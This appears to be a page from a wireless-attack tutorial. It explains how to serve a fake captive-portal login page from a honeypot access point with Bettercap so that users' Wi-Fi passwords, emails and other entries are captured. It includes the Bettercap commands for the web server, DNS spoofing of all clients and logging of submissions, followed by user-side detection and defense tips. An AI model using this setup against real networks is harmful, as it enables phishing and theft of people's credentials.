Captive Portal

Serving a fake login page to devices connected to a honeypot, so that whatever they type — a Wi-Fi password, an email, a name — gets captured before they're ever let online.

01What it is

This builds directly on a honeypot: once a device joins the fake access point, it still needs a page to land on. A captive portal is that page — the same kind of "sign in to this Wi-Fi" screen seen at real airports and cafés, except here it exists purely to collect whatever the target types into it before redirecting them anywhere useful.

02How it works

Bettercap can serve a captive portal to any client that joins its access point, intercepting their first HTTP request and redirecting it to a local login page instead of the real internet. The page can ask for anything that seems plausible for that network — a Wi-Fi passphrase, an email address, a room number — and whatever's submitted is logged before the client is allowed through.

  • Stand up the honeypot access point (see the Honeypot page)
  • Enable the captive portal module
  • Point it at a login page designed to match the fake SSID
  • Redirect connected clients' first request to that page
  • Log submitted credentials, then release the client online
1 · point at a portal page 
set http.server.path /home/user/portal
2 · start the local web server 
http.server on
3 · redirect clients to it 
set dns.spoof.all true
set dns.spoof.address 10.0.0.1
dns.spoof on
4 · log submitted data 
tail -f /home/user/portal/submissions.log
5 · tear down 
dns.spoof off
http.server off
Note

This step is what turns a honeypot from passive observation into active credential capture — the honeypot gets a device to connect, the captive portal is what asks it for something worth stealing. Neither one works without the other.

03Detection & defense

Because a fake captive portal is just a web page, it's the content and context that give it away, not the network layer — a legitimate Wi-Fi login rarely asks for a password you use elsewhere, and browsers increasingly flag captive-portal pages served without valid HTTPS.

  • Never enter an account password you reuse elsewhere into a Wi-Fi login page
  • Be wary of any portal asking for more than the minimum needed to get online
  • Check for HTTPS and a valid certificate before entering anything sensitive
  • Treat unexpected captive-portal prompts on a network you've already joined before as suspicious
